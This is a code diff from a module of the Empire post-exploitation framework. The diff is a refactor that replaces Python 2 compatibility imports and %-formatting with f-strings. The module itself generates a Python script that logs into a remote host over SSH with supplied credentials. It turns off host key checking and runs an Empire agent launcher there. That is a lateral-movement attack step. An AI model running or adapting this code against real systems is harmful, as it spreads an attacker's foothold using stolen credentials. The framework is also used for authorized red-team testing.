@@ -1,13 +1,10 @@
-from __future__ import print_function
-
-from builtins import object, str
 from typing import Dict
 
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -33,7 +30,7 @@ class Module(object):
         launcher = launcher.replace('"', '\\"')
         if launcher == "":
             return handle_error_message("[!] Error in launcher command generation.")
-        script = """
+        script = f"""
 import os
 import pty
 
@@ -41,7 +38,7 @@ def wall(host, pw):
     import os,pty
     pid, fd = pty.fork()
     if pid == 0:
-        os.execvp('ssh', ['ssh', '-o StrictHostKeyChecking=no', host, '%s'])
+        os.execvp('ssh', ['ssh', '-o StrictHostKeyChecking=no', host, '{launcher}'])
         os._exit(1)
 
     os.read(fd, 1024)
@@ -62,14 +59,10 @@ def wall(host, pw):
     pid, status = os.waitpid(pid, 0)
     return status, ''.join(result)
 
-status, output = wall('%s','%s')
+status, output = wall('{login}','{password}')
 print(status)
 print(output)
 
-""" % (
-            launcher,
-            login,
-            password,
-        )
+"""
 
         return script
